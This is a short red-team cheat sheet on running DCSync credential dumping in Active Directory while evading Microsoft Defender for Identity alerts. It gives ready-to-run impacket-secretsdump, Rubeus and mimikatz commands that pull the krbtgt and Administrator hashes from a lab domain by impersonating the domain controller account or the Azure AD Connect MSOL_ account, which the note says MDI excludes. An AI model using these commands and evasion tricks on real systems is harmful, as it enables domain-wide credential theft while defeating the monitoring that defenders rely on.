# OPSEC DCSYNC
- DCSync: it uses the Directory Replication Service to request from a DC to synchronize a specified entry.
- DCSync is less prone to detection by AV/EDR but MDI detects it.
- MDI alerts:
![](img/Pasted%20image%2020260417095944.png)

![](img/Pasted%20image%2020260417095956.png)
To bypass MDI detection:
- Avoid suspicious logs and bypass MDI by using Domain Controller identity (domain-dc$).
- Hybrid identity:
	- AD Connect synchronizes hashes every two minutes, in an Enterprise Environment, using the `MSOL_ \<installationidentifier\>` account 
	- `MSOL_` account will be excluded from tools like MDI, this will allow us to run DCSync without any alerts.

- Use a domain controller identity or the MSOL_ account in hybrid identity environment 
```
# Opsec friendly from Linux
impacket-secretsdump -dc-ip 172.23.126.134 'yhp0w.lan/dc01$'@dc01.yhp0w.lan -aesKey f6cc80f83cfcfb67177a65d39d43c09c2ed07815e4dea3528e735cdd658b5ab2 -just-dc-user krbtgt

# Opsec friendly from windows
# Get a TGT as MSOL_ account
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe asktgt /domain:yhp0w.lan /dc:dc01.yhp0w.lan /user:MSOL_9c658791b701 /aes256:7d89e84ba529220ad87a1f7f5760ff729b984a45ab27e893091d641b323a72d9 /enctype:aes256 /opsec /nowrap /ptt
# DCSync
mimikatz.exe "lsadump::dcsync /user:Administrator /dc:dc01.yhp0w.lan /domain:yhp0w.lan" "exit"
```

![](img/Pasted%20image%2020260421153243.png)

![](img/Pasted%20image%2020260421153313.png)


